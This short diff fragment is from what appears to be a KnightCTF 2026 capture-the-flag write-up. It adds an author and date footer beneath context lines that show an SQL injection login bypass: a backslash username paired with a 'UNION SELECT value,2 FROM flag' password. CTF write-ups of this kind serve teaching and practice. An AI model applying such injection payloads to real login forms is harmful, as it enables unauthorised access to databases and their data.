@@ -56,3 +56,8 @@ UNION SELECT value,2 FROM flag -- -
 username = \
 password = UNION SELECT value,2 FROM flag -- -
 ```
+---
+
+**Author:** MR. Umair   
+**Date:** January 20, 2026  
+**Competition:** KnightCTF 2026
